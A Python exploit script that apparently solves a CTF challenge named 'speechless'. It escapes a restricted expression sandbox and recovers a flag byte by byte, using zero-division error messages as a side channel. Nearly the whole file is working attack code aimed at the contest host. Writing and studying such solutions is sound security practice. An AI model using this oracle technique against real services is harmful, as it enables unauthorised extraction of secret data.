#!/usr/bin/env python3

# The service only accepts the characters ab.=-/, so we treat it like a
# register machine: math expressions succeed silently, but faults produce the
# message "stop breaking things >:(" which we can observe. By building arbitrary
# constants via repeated doubling/addition and probing with divisions, we learn
# each flag byte through zero-division side channels.


from __future__ import annotations

import argparse
import string
from typing import Iterable, List

try:
    from pwn import context, process, remote, tube
except ModuleNotFoundError:  # pragma: no cover - fallback for environments without pwntools
    import socket
    import subprocess

    class _Context:
        log_level = "info"

    context = _Context()

    class tube:  # type: ignore
        def sendline(self, data: bytes) -> None:  # pragma: no cover - overridden in subclasses
            raise NotImplementedError

        def recvuntil(self, marker: bytes) -> bytes:  # pragma: no cover
            raise NotImplementedError

        def close(self) -> None:  # pragma: no cover
            raise NotImplementedError

    class _ProcTube(tube):
        def __init__(self, argv):
            self.proc = subprocess.Popen(
                argv,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                bufsize=0,
            )

        def sendline(self, data: bytes) -> None:
            if not self.proc.stdin:
                raise RuntimeError("process stdin is closed")
            self.proc.stdin.write(data + b"\n")
            self.proc.stdin.flush()

        def recvuntil(self, marker: bytes) -> bytes:
            if not self.proc.stdout:
                raise RuntimeError("process stdout is closed")
            buf = bytearray()
            while not buf.endswith(marker):
                chunk = self.proc.stdout.read(1)
                if not chunk:
                    raise EOFError("process terminated unexpectedly")
                buf.extend(chunk)
            return bytes(buf)

        def close(self) -> None:
            self.proc.terminate()
            self.proc.wait(timeout=1)

    class _SocketTube(tube):
        def __init__(self, host: str, port: int):
            self.sock = socket.create_connection((host, port))

        def sendline(self, data: bytes) -> None:
            self.sock.sendall(data + b"\n")

        def recvuntil(self, marker: bytes) -> bytes:
            buf = bytearray()
            while not buf.endswith(marker):
                chunk = self.sock.recv(1)
                if not chunk:
                    raise EOFError("connection closed")
                buf.extend(chunk)
            return bytes(buf)

        def close(self) -> None:
            self.sock.close()

    def process(argv):
        return _ProcTube(argv)

    def remote(host: str, port: int):
        return _SocketTube(host, port)

PROMPT = b">>> "
ALLOWED = set("ab.=-/")


def recv_prompt(io: tube) -> bytes:
    return io.recvuntil(PROMPT)


def send_expr(io: tube, expr: str) -> tuple[bool, str]:
    if not expr:
        raise ValueError("empty expression")
    if not set(expr) <= ALLOWED:
        raise ValueError(f"illegal characters in payload: {expr!r}")
    io.sendline(expr.encode())
    raw = recv_prompt(io)
    body = raw[:-len(PROMPT)].decode(errors="replace")

    if "you need to try harder" in body:
        raise RuntimeError(f"blocked characters detected for expression {expr!r}")
    if "stop comparing the flag" in body:
        raise RuntimeError(f"comparison filter triggered for {expr!r}")

    if "stop breaking things >:(" in body:
        return False, body.strip()
    return True, body.strip()


def enumerate_variables(io: tube, max_len: int = 256) -> List[str]:
    vars_found: List[str] = []
    for i in range(1, max_len + 1):
        name = "b" * i
        success, _ = send_expr(io, name)
        if not success:
            break
        vars_found.append(name)
    if not vars_found:
        raise RuntimeError("no flag bytes discovered")
    return vars_found


def find_nonzero_var(io: tube, names: Iterable[str]) -> str:
    for name in names:
        success, _ = send_expr(io, f"{name}//{name}")
        if success:
            return name
    raise RuntimeError("every available variable was zero; cannot build constants")


def zero(io: tube, base_var: str) -> None:
    send_expr(io, f"{base_var}-{base_var}")


def double(io: tube) -> None:
    send_expr(io, "a--a")


def add_one(io: tube, base_var: str) -> None:
    send_expr(io, f"a--{base_var}//{base_var}")


def set_constant(io: tube, base_var: str, value: int) -> None:
    if value < 0 or value > 255:
        raise ValueError("only byte-sized constants are supported")
    zero(io, base_var)
    if value == 0:
        return
    bits = bin(value)[2:]
    for bit in bits:
        double(io)
        if bit == "1":
            add_one(io, base_var)


def test_guess(io: tube, base_var: str, target_var: str, guess: int) -> bool:
    set_constant(io, base_var, guess)
    success, _ = send_expr(io, f"{target_var}-a")
    if not success:
        raise RuntimeError("unexpected failure while subtracting guess")
    success, _ = send_expr(io, f"{base_var}//a")
    return not success  # Zero-division => guess correct


def build_alphabet(custom: str | None = None, strict: bool = False) -> List[int]:
    base = custom if custom else "infobahn{}_-" + string.digits + string.ascii_lowercase + string.ascii_uppercase
    seen: List[int] = []
    seen_set = set()

    def add_char(ch: str) -> None:
        if not ch:
            return
        code = ord(ch[0])
        if code < 0 or code > 255 or code in seen_set:
            return
        seen.append(code)
        seen_set.add(code)

    for ch in base:
        add_char(ch)

    if not strict:
        for code in range(32, 127):
            if code not in seen_set:
                seen.append(code)
                seen_set.add(code)
        if 10 not in seen_set:  # newline
            seen.append(10)

    if not seen:
        raise ValueError("alphabet is empty")
    return seen


def recover_flag(
    io: tube,
    known_prefix: str | None = None,
    alphabet: List[int] | None = None,
    assume_prefix: bool = False,
) -> str:
    recv_prompt(io)  # sync initial prompt
    var_names = enumerate_variables(io)
    base_var = find_nonzero_var(io, var_names)

    alphabet = alphabet or build_alphabet()
    recovered = []

    for idx, name in enumerate(var_names, start=1):
        print(f"[+] Recovering byte {idx}/{len(var_names)} via {name!r}")
        if assume_prefix and known_prefix and idx <= len(known_prefix):
            recovered.append(known_prefix[idx - 1])
            print(f"    -> assumed {known_prefix[idx - 1]!r}")
            continue
        ordered_guesses = alphabet
        if known_prefix and idx <= len(known_prefix):
            prioritized = ord(known_prefix[idx - 1])
            ordered_guesses = [prioritized] + [g for g in alphabet if g != prioritized]
        for guess in ordered_guesses:
            if test_guess(io, base_var, name, guess):
                recovered.append(chr(guess))
                print(f"    -> {chr(guess)!r}")
                break
        else:
            raise RuntimeError(f"unable to determine value for {name}")
    return "".join(recovered)


def build_io(args: argparse.Namespace) -> tube:
    if args.local:
        return process(["python3", "-u", "chall-speech.py"])
    return remote(args.host, args.port)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Exploit chall-speech.py")
    parser.add_argument("--host", default="speechless.challs.infobahnc.tf")
    parser.add_argument("--port", type=int, default=1337)
    parser.add_argument("--local", action="store_true", help="run against a local chall-speech.py process")
    parser.add_argument("--log-level", default="info", choices=["debug", "info", "warn", "error"])
    parser.add_argument("--known-prefix", default="", help="optional known flag prefix to prioritize guesses (e.g. infobahn{)")
    parser.add_argument("--assume-prefix", action="store_true", help="skip verifying the known prefix on the wire")
    parser.add_argument("--charset", default="", help="characters to prioritize/limit guesses (defaults to printable ASCII)")
    parser.add_argument("--strict-charset", action="store_true", help="only use --charset characters (no fallback)")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    context.log_level = args.log_level
    io = build_io(args)
    try:
        prefix = args.known_prefix or None
        alphabet = build_alphabet(args.charset or None, args.strict_charset)
        flag = recover_flag(io, prefix, alphabet=alphabet, assume_prefix=args.assume_prefix)
        print(f"[+] Flag: {flag}")
    finally:
        io.close()


if __name__ == "__main__":
    main()
